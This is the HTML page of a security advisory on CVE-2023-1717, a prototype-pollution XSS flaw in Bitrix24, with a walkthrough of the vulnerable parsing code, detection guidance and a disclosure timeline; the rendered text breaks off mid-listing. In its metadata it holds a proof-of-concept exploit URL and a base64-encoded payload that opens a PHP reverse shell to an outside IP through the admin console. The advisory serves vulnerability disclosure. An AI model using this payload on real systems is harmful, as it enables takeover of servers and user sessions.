<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>(CVE-2023-1717) Bitrix24 Cross-Site Scripting (XSS) via Client-side Prototype Pollution | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity Critical   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1717   CVE Description Prototype pollution in bitrix/templates/bitrix24/components/bitrix/menu/left_vertical/script.js in Bitrix24 22.0.300 allows remote attackers to execute arbitrary JavaScript code in the victim’s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via polluting __proto__[tag] and __proto__[text].">
<meta name="author" content="Lam Jun Rong &amp; Li Jiantao (@CurseRed)">
<link rel="canonical" href="https://starlabs.sg/advisories/23/23-1717/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="(CVE-2023-1717) Bitrix24 Cross-Site Scripting (XSS) via Client-side Prototype Pollution" />
<meta property="og:description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity Critical   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1717   CVE Description Prototype pollution in bitrix/templates/bitrix24/components/bitrix/menu/left_vertical/script.js in Bitrix24 22.0.300 allows remote attackers to execute arbitrary JavaScript code in the victim’s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via polluting __proto__[tag] and __proto__[text]." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/advisories/23/23-1717/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
<meta property="article:published_time" content="2023-11-01T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-11-01T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="(CVE-2023-1717) Bitrix24 Cross-Site Scripting (XSS) via Client-side Prototype Pollution"/>
<meta name="twitter:description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity Critical   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1717   CVE Description Prototype pollution in bitrix/templates/bitrix24/components/bitrix/menu/left_vertical/script.js in Bitrix24 22.0.300 allows remote attackers to execute arbitrary JavaScript code in the victim’s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via polluting __proto__[tag] and __proto__[text]."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Advisories",
      "item": "https://starlabs.sg/advisories/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "(CVE-2023-1717) Bitrix24 Cross-Site Scripting (XSS) via Client-side Prototype Pollution",
      "item": "https://starlabs.sg/advisories/23/23-1717/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "(CVE-2023-1717) Bitrix24 Cross-Site Scripting (XSS) via Client-side Prototype Pollution",
  "name": "(CVE-2023-1717) Bitrix24 Cross-Site Scripting (XSS) via Client-side Prototype Pollution",
  "description": "Summary:    Product Bitrix24     Vendor Bitrix24   Severity Critical   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1717   CVE Description Prototype pollution in bitrix/templates/bitrix24/components/bitrix/menu/left_vertical/script.js in Bitrix24 22.0.300 allows remote attackers to execute arbitrary JavaScript code in the victim’s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via polluting __proto__[tag] and __proto__[text].",
  "keywords": [
    
  ],
  "articleBody": "Summary:    Product Bitrix24     Vendor Bitrix24   Severity Critical   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1717   CVE Description Prototype pollution in bitrix/templates/bitrix24/components/bitrix/menu/left_vertical/script.js in Bitrix24 22.0.300 allows remote attackers to execute arbitrary JavaScript code in the victim’s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via polluting __proto__[tag] and __proto__[text].   CWE Classification(s) CWE-1321 Prototype Pollution; CWE-79 Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)   CAPEC Classification(s) CAPEC-588 DOM-Based XSS    CVSS3.1 Scoring System: Base Score: 9.6 (Critical) Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) Low   Privileges Required (PR) None   User Interaction (UI) Required   Scope (S) Changed   Confidentiality (C) High   Integrity (I) High   Availability (A) High    Vulnerability Details: This report presents information on a client-side prototype pollution vulnerability present in the core.js JavaScript file that is included in almost every Bitrix24 page. On certain pages, prototype pollution gadgets are available, allowing an attacker to execute arbitrary JavaScript code on the browser of any victim that visits the affected page. If the victim has administrator permissions, an attacker may leverage the built-in “PHP Command Line” feature to execute arbitrary system commands on the target web server.\nThe current page’s URL is parsed with the main_core.Uri constructor on line 2144 in bitrix/templates/bitrix24/components/bitrix/menu/left_vertical/script.js, which is included on every page with a left vertical menu. As this menu is a core component, almost every page on Bitrix24 is affected.\nbabelHelpers.classPrivateFieldSet(this, _actualLink, new main_core.Uri(window.location.href)); The Uri constructor then calls the parseUrl function:\n// bitrix/js/main/core/core.js lines 10168 to 10171  function Uri(url = '') { babelHelpers.classCallCheck(this, Uri); map.set(this, parseUrl(url)); } The parseUrl JavaScript function is used to parse URLs into their components.\n// bitrix/js/main/core/core.js lines 10082 to 10105  const urlExp = /^((\\w+):)?(\\/\\/((\\w+)?(:(\\w+))?@)?([^\\/\\?:]+)(:(\\d+))?)?(\\/?([^\\/\\?#][^\\?#]*)?)?(\\?([^#]+))?(#(\\w*))?/; function parseUrl(url) { const result = url.match(urlExp); if (Type.isArray(result)) { const queryParams = parseQuery(result[14]); return { useShort: /^\\/\\//.test(url), href: result[0] || '', schema: result[2] || '', host: result[8] || '', port: result[10] || '', path: result[11] || '', query: result[14] || '', queryParams, hash: result[16] || '', username: result[5] || '', password: result[7] || '', origin: result[8] || '' }; } return {}; } The query string is further parsed by the parseQuery function:\n// bitrix/js/main/core/core.js lines 10062 to 10080  function parseQuery(input) { if (!Type.isString(input)) { return {}; } const url = input.trim().replace(/^[?#\u0026]/, ''); if (!url) { return {}; } return url.split('\u0026').reduce((acc, param) = { const [key, value] = param.replace(/\\+/g, ' ').split('='); const keyFormat = getKeyFormat(key); const formatter = getParser(keyFormat); formatter(key, value, acc); return acc; }, {}); } For certain query parameter keys, additional parsing is performed.\nThe format of these keys is determined by the getKeyFormat function.\n// bitrix/js/main/core/core.js lines 10050 to 10060  function getKeyFormat(key) { if (/^\\w+\\[([\\w]+)\\]$/.test(key)) { return 'index'; } if (/^\\w+\\[\\]$/.test(key)) { return 'bracket'; } return 'default'; } If the key is of the form aaa[bbb], the format returned will be index. We will focus on this type of key for the rest of the report.\nParsing is then performed by the formatter returned by getParser:\n// bitrix/js/main/core/core.js lines 10005 to 10048  function getParser(format) { switch (format) { case 'index': return (sourceKey, value, accumulator) = { const result = /\\[(\\w*)\\]$/.exec(sourceKey); // [1]  const key = sourceKey.replace(/\\[\\w*\\]$/, ''); // [2]  if (Type.isNil(result)) { accumulator[key] = value; return; } if (Type.isUndefined(accumulator[key])) { accumulator[key] = {}; } accumulator[key][result[1]] = value; // [3]  }; case 'bracket': // parse bracket style keys  default: // parse default style keys  } } The getParser returns a function that, when passed a sourceKey and the value corresponding to that key, parses the key and adds it to the JavaScript object accumulator.\nAs the attacker has control over the sourceKey and value parameters via the URL’s query string, they have control over the result and key variables as they are derived from sourceKey via the regex in [1] and [2].\nAn attacker could pollute the global JavaScript prototype by setting key to __proto__. For example, let sourceKey be __proto__[bbb] and value be ccc. In [1], result will be ['[bbb]', 'bbb'], and in [2], key will be __proto__.\nTherefore, in [3], accumulator['__proto__']['bbb'] will be set to ccc. As the __proto__ property of a JavaScript object refers to the Object.prototype shared by all JavaScript objects, the property bbb with the value ccc will now be present in all JavaScript objects.\nOn certain pages, the presence of a prototype pollution gadget in the BX.Main.Filter component allows an attacker to execute arbitrary JavaScript code on the victim’s browser.\nUpon page load and subsequent initialization of the filter component, the setPreset function is called:\n// bitrix/cache/js/s1/bitrix24/page_17c0769aa6008d4b7096462e823dd9d6/page_17c0769aa6008d4b7096462e823dd9d6_v1.js?1678346430206239 // sourcemapped to script.js, lines 2507 to 2581  function setPreset(presetData) { var container = this.getContainer(); var square, squares; var squaresResult; if (BX.type.isPlainObject(presetData)) { squares = BX.Filter.Utils.getByClass(container, this.parent.settings.classSquare, true); squares.forEach(BX.remove); presetData = BX.clone(presetData); presetData.ADDITIONAL = presetData.ADDITIONAL || []; BX.onCustomEvent(window, 'BX.Filter.Search:beforeSquaresUpdate', [presetData, this]); if (presetData.ID !== 'default_filter' \u0026\u0026 presetData.ID !== 'tmp_filter') { square = BX.decl({ // [4]  block: 'main-ui-search-square', name: presetData.TITLE, value: presetData.ID, isPreset: true }); BX.prepend(square, container); // [5]  // ...  } else { // ...  } // ...  } } In [4] a HTML element is constructed via the BX.decl function, and in [5] the resultant square element is inserted into the DOM via the BX.prepend function.\nBX.decl is a simple wrapper over the BX.render function, shown below:\n// bitrix/js/main/core/core_decl.js lines 21 to 95  BX.render = function(item) { var element = null; if (isBlock(item) || isTag(item)) { var tag = 'tag' in item ? item.tag : 'div'; // [6]  var className = item.block; var attrs = 'attrs' in item ? item.attrs : {}; var events = 'events' in item ? item.events : {}; var props = {}; // Load props, atts and events  element = BX.create(tag, {props: props, attrs: attrs, events: events, children: children, html: text}); } // ...  return element; }; As the tag property is not present on the object passed to BX.decl and eventually BX.render, the JavaScript engine checks if the property exists on the global object prototype. An attacker could use the prototype pollution vulnerability discussed earlier to set the tag property to script. The tag property is accessed in [6] and passed to the BX.create function (shown below):\n// bitrix/js/main/core/core.js lines 8931 to 8941  function create(tag, data = {}, context = document) { let tagName = tag; let options = data; if (Type.isObjectLike(tag)) { options = tag; tagName = tag.tag; } return Dom.adjust(context.createElement(tagName), options); } The BX.create function creates a HTML element according to the tag parameter using document.createElement and passes the element to Dom.adjust:\n// bitrix/js/main/core/core.js lines 8841 to 8920  function adjust(target, data = {}) { if (!target.nodeType) { return null; } let element = target; if (target.nodeType === Node.DOCUMENT_NODE) { element = target.body; } if (Type.isPlainObject(data)) { // Initialize element attrs, event handlers, styles  if ('text' in data \u0026\u0026 !Type.isNil(data.text)) { element.innerText = data.text; // [7]  return element; } if ('html' in data \u0026\u0026 !Type.isNil(data.html)) { element.innerHTML = data.html; } } return element; } As the text property of the data object is not present, an attacker could control this value via prototype pollution.\nTherefore, by controlling the HTML element type by polluting the tag property to script and polluting the text property with attacker controlled JavaScript, an attacker could execute arbitrary JavaScript on the user’s browser.\nProof-of-Concept: The PoC provided below targets the https://TARGET_HOST/workgroups/ page. However, any page that includes both the left vertical menu component and the BX.Main.Filter component will be vulnerable.\nAny user accessing the following URL will result in the anchor portion of the URL being base64 decoded and executed as JavaScript:\nhttps://TARGET_HOST/workgroups/?__proto__[tag]=script\u0026__proto__[text]=eval(atob(location.hash.substring(1))) For example, if the anchor is\nZmV0Y2goIi9iaXRyaXgvYWRtaW4vcGhwX2NvbW1hbmRfbGluZS5waHA/bGFuZz1lbiYiK2RvY3VtZW50LmJvZHkuaW5uZXJIVE1MLm1hdGNoKC9zZXNzaWQ9W2EtZjAtOV17MzJ9LylbMF0sewogICAgbWV0aG9kOiJQT1NUIiwKICAgIGhlYWRlcnM6ewogICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcKICAgIH0sICAgIAogICAgYm9keTogbmV3IFVSTFNlYXJjaFBhcmFtcyh7CiAgICAgICAgcXVlcnk6IGAkc29jaz1mc29ja29wZW4oIjE5Mi4xNjguODYuMTI1Iiw5MDAxKTskcHJvYz1wcm9jX29wZW4oIi9iaW4vc2ggLWkiLCBhcnJheSgwPT4kc29jaywgMT0+JHNvY2ssIDI9PiRzb2NrKSwkcGlwZXMpO2AsCiAgICAgICAgYWpheDogInkiLAogICAgICAgIHJlc3VsdF9hc190ZXh0OiJOIgogICAgfSkKfSk= which is a base64 encoded version of\nfetch(\"/bitrix/admin/php_command_line.php?lang=en\u0026\"+document.body.innerHTML.match(/sessid=[a-f0-9]{32}/)[0],{ method:\"POST\", headers:{ 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ query: `$sock=fsockopen(\"192.168.86.125\",9001);$proc=proc_open(\"/bin/sh -i\", array(0=$sock, 1=$sock, 2=$sock),$pipes);`, ajax: \"y\", result_as_text:\"N\" }) }) and the user is an administrator, a reverse shell connection will be opened to 192.168.86.125 on port 9001.\nExploit Conditions: An attacker does not require any permissions to carry out this attack. However, the victim needs to visit a specially crafted URL supplied by the attacker.\nDetection Guidance: It is possible to detect the exploitation of this vulnerability by examining traffic logs to detect the presence of the string __proto__ in the query parameters of requests.\nCredits Lam Jun Rong \u0026 Li Jiantao of of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline  2023-03-17 Initial Vendor Contact via https://www.bitrix24.com/report/ 2023-03-18 No reply from vendor, tried using the form again 2023-03-21 Email to info@bitrix.com 2023-03-21 Email to info@1c-bitrix.ru 2023-03-24 Got reply from info@1c-bitrix.ru, they asked us to email to info@bitrix.com or use the form at https://www.bitrix24.com/report/ with regards to the bug reports 2023-03-29 Emailed to [redacted], [redacted] \u0026 [redacted]. Team member found the 3 email addresses via an [USA bug bounty platform] 2023-03-30 [redacted] replied to us 2023-03-31 [redacted] wanted us to report the bugs via that [USA bug bounty platform] 2023-03-31 Emailed back to [redacted] that we are unable to do so because it’s a private program in that [USA bug bounty platform] 2023-03-31 [redacted] emailed back with the invite 2023-03-31 Submitted the reports via that [USA bug bounty platform] 2023-03-31 Informed [redacted] again that we are unable to report all the bugs due to [blah blah blah Requirements] 2023-04-03 [redacted] replied that they had remove the [blah blah blah Requirements] limitations for us 2023-04-04 We submitted the final 2 reports 2023-06-21 [redacted] emailed us “Generally, we prefer not to publish CVE, because our clients tend to postpone or skip even critical updates, and hackers definitely will be using this information for attacking our clients. It have happened several times in the past, with huge consequences for our company and for our clients. To tell the truth, I would like to set award on [USA bug bounty platform] instead of CVE publishing. Please let me know what do you think about that.” 2023-06-23 Emailed back to Bitrix that we prefer to publish the CVE and do not want the reward. We are also willing to delay the publication at a mutually agreed date. 2023-09-22 [redacted] finally replied asking us if we are agreeable to publish the CVE in November 2023 2023-09-22 Emailed back that we are agreeable to delay the publication to 1st November 2023 2023-09-22 [redacted] accepted the date 2023-11-01 Public Release  ",
  "wordCount" : "1705",
  "inLanguage": "en",
  "datePublished": "2023-11-01T00:00:00Z",
  "dateModified": "2023-11-01T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Lam Jun Rong \u0026 Li Jiantao (@CurseRed)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/advisories/23/23-1717/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
    <h1 class="post-title">
      (CVE-2023-1717) Bitrix24 Cross-Site Scripting (XSS) via Client-side Prototype Pollution
    </h1>
    <div class="post-meta"><span title='2023-11-01 00:00:00 +0000 UTC'>November 1, 2023</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Lam Jun Rong &amp; Li Jiantao (@CurseRed)

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#summary" aria-label="Summary:">Summary:</a></li>
                <li>
                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System:">CVSS3.1 Scoring System:</a></li>
                <li>
                    <a href="#vulnerability-details" aria-label="Vulnerability Details:">Vulnerability Details:</a></li>
                <li>
                    <a href="#proof-of-concept" aria-label="Proof-of-Concept:">Proof-of-Concept:</a></li>
                <li>
                    <a href="#exploit-conditions" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
                <li>
                    <a href="#detection-guidance" aria-label="Detection Guidance:">Detection Guidance:</a></li>
                <li>
                    <a href="#credits" aria-label="Credits">Credits</a></li>
                <li>
                    <a href="#timeline" aria-label="Timeline">Timeline</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="summary">Summary:<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Bitrix24</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Vendor</strong></td>
<td>Bitrix24</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>Critical</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>Bitrix24 22.0.300 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>Bitrix24 22.0.300 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>CVE-2023-1717</td>
</tr>
<tr>
<td><strong>CVE Description</strong></td>
<td>Prototype pollution in bitrix/templates/bitrix24/components/bitrix/menu/left_vertical/script.js in Bitrix24 22.0.300 allows remote attackers to execute arbitrary JavaScript code in the victim’s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via polluting <code>__proto__[tag]</code> and <code>__proto__[text]</code>.</td>
</tr>
<tr>
<td><strong>CWE Classification(s)</strong></td>
<td>CWE-1321 Prototype Pollution; CWE-79 Improper Neutralization of Input During Web Page Generation (&lsquo;Cross-site Scripting&rsquo;)</td>
</tr>
<tr>
<td><strong>CAPEC Classification(s)</strong></td>
<td>CAPEC-588 DOM-Based XSS</td>
</tr>
</tbody>
</table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
<p><strong>Base Score:</strong> 9.6 (Critical)
<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>Required</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Changed</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody>
</table>
<h2 id="vulnerability-details">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
<p>This report presents information on a client-side prototype pollution vulnerability present in the <code>core.js</code> JavaScript file that is included in almost every Bitrix24 page. On certain pages, prototype pollution gadgets are available, allowing an attacker to execute arbitrary JavaScript code on the browser of any victim that visits the affected page. If the victim has administrator permissions, an attacker may leverage the built-in &ldquo;PHP Command Line&rdquo; feature to execute arbitrary system commands on the target web server.</p>
<p>The current page&rsquo;s URL is parsed with the <code>main_core.Uri</code> constructor on line 2144 in <code>bitrix/templates/bitrix24/components/bitrix/menu/left_vertical/script.js</code>, which is included on every page with a left vertical menu. As this menu is a core component, almost every page on Bitrix24 is affected.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">babelHelpers</span><span class="p">.</span><span class="nx">classPrivateFieldSet</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="nx">_actualLink</span><span class="p">,</span> <span class="k">new</span> <span class="nx">main_core</span><span class="p">.</span><span class="nx">Uri</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">));</span>
</span></span></code></pre></div><p>The <code>Uri</code> constructor then calls the <code>parseUrl</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// bitrix/js/main/core/core.js lines 10168 to 10171
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">Uri</span><span class="p">(</span><span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">babelHelpers</span><span class="p">.</span><span class="nx">classCallCheck</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="nx">Uri</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">map</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="nx">parseUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The <code>parseUrl</code> JavaScript function is used to parse URLs into their components.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// bitrix/js/main/core/core.js lines 10082 to 10105
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">urlExp</span> <span class="o">=</span> <span class="sr">/^((\w+):)?(\/\/((\w+)?(:(\w+))?@)?([^\/\?:]+)(:(\d+))?)?(\/?([^\/\?#][^\?#]*)?)?(\?([^#]+))?(#(\w*))?/</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">parseUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">urlExp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">Type</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">result</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">queryParams</span> <span class="o">=</span> <span class="nx">parseQuery</span><span class="p">(</span><span class="nx">result</span><span class="p">[</span><span class="mi">14</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">useShort</span><span class="o">:</span> <span class="sr">/^\/\//</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">url</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="nx">href</span><span class="o">:</span> <span class="nx">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">schema</span><span class="o">:</span> <span class="nx">result</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">host</span><span class="o">:</span> <span class="nx">result</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">port</span><span class="o">:</span> <span class="nx">result</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">path</span><span class="o">:</span> <span class="nx">result</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">query</span><span class="o">:</span> <span class="nx">result</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">queryParams</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">hash</span><span class="o">:</span> <span class="nx">result</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">username</span><span class="o">:</span> <span class="nx">result</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">password</span><span class="o">:</span> <span class="nx">result</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">origin</span><span class="o">:</span> <span class="nx">result</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The query string is further parsed by the <code>parseQuery</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// bitrix/js/main/core/core.js lines 10062 to 10080
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">parseQuery</span><span class="p">(</span><span class="nx">input</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Type</span><span class="p">.</span><span class="nx">isString</span><span class="p">(</span><span class="nx">input</span><span class="p">))</span> <span class="p">{</span>
